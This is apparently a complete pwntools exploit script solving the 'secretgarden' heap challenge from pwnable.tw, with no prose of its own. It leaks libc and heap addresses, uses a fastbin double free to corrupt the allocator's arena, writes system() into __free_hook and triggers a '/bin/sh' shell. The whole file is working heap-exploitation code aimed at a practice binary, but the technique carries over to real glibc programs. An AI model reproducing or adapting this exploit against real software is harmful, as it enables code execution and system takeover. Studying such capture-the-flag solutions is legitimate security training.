from pwn import *
io = process('./secretgarden')
#io = remote('chall.pwnable.tw',10203)
l = ELF('./libc_64.so.6')

context.log_level = 'info'

def menu(ch):
    io.recvuntil('Your choice : ')
    io.sendline(str(ch))

def flower(name, color, length = 0):
    menu(1)
    io.recvuntil('Length of the name :')
    if length:
        io.sendline(str(length))
    else:
        io.sendline(str(len(name)))
    io.recvuntil('The name of flower :')
    io.sendline(name)
    io.recvuntil('The color of the flower :')
    io.sendline(color)
    
def remove(idx):
    menu(3)
    io.recvuntil('Which flower do you want to remove from the garden:')
    io.sendline(str(idx))

#leak libc address
flower('a' * 0x1f0 + p64(0x30) + 'a' * 8, 'A' * 23) # 0
flower('b' * 0x200, 'B' * 23) # 1
remove(1)
remove(0)
flower('', 'C' * 23, 0x100) # 2
menu(2) #visit
io.recvuntil('[2] :')
libc_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
main_arena = libc_addr - 0xa
log.info('libc_addr :' + hex(libc_addr))
log.info('main_arena :' + hex(main_arena))
remove(2)
menu(4) #clean

libc_main = libc_addr - 0xa - (l.symbols['__malloc_hook'] + 0x30)

#leak heap address
flower('a', 'A' * 23) #0
flower('b', 'B' * 23) #1
remove(1)
remove(0)
flower('', 'C' * 23) #2
menu(2) #visit
io.recvuntil('[2] :')
heap_addr = u64(io.recvuntil('\nColor')[:-6].ljust(8, '\x00'))
log.info('heap_addr :' + hex(heap_addr))
remove(2)
menu(4) #clean

# make a dup into stack attack
flower('a' * 0x60, 'A' * 23) # 0
flower('b' * 0x60, 'B' * 23) # 1
flower('c' * 0x60, 'C' * 23) # 2
flower('d' * 0x60, 'D' * 23) # 3

# fastbin is LIFO
remove(1) # malloced as name chunk
remove(0) # malloced as control chunk 
remove(1) # malloced as name chunk
#malloc the first two
flower(p64(main_arena - 0x40 + 0xd - 0x20) + 'e' * 0x58, 'E' * 23) # 4 
flower('f' * 0x60, 'F' * 23) #5
flower('g' * 0x60, 'G' * 23) # 6

#next malloc will be the chunk on heap
payload  = '\x00'*3 + 7 * p64(0)
payload += p64(0x71)
payload = payload.ljust(0x60, '\x00')
flower(payload, 'H' * 23) #7 
#do it again
remove(1)
remove(0)
remove(1)
flower(p64(main_arena - 0x10) + 'i' * 0x58, 'I' * 23) #8
flower('/bin/sh\x00'.ljust(0x60, 'j'), 'J' * 23) #9
flower('k' * 0x60, 'K' * 23) #10

#over write the top_chunk pointer in main_arena + 88
flower(p64(0) * 11 + p64(libc_main + l.symbols['__free_hook'] - 4020), 'J' * 23)
#now the malloc will be in new top chunks, we just need to calculate the right malloc_size to free_hook
io.sendline('1')
io.sendline(str(4020-0x30))
io.sendline('\x00' * (4020-0x40) + p64(libc_main + l.symbols['system']))
io.sendline('3')
io.sendline('9')
io.interactive()
